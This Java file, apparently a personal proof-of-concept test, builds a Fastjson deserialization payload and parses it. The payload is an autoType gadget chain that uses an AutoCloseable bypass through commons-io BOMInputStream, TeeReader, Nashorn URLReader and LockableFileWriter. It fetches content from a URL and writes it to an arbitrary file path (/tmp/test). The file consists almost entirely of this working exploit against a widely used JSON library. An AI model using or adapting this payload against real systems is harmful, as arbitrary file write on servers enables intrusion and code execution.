package com.example.servletdemo.fastjsontest;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;
import org.apache.commons.io.output.LockableFileWriter;
/**
 * @author : Walker
 * @date : Created in 2022/5/12 4:02 PM
 * @description:
 */
public class test2 {

    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String x1 = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\":{\n" +
                "      \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": {\"@type\": \"org.apache.commons.io.input.TeeReader\",\n" +
                "        \"input\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"http://127.0.0.1:8082/2.txt\"\n" +
                "        },\n" +
                "        \"branch\": {\n" +
                "          \"@type\":\"org.apache.commons.io.output.LockableFileWriter\",\n" +
                "          \"file\":\"/tmp/test\",\n" +
                "          \"charset\":\"UTF-8\",\n" +
                "          \"append\":false,\n" +
                "          \"lockDir\":\"/tmp/xxx/\"\n" +
                "        },\n" +
                "        \"closeBranch\":false\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 20000\n" +
                "    },\n" +
                "    \"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [97]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
        JSON.parse(x1);
    }
}
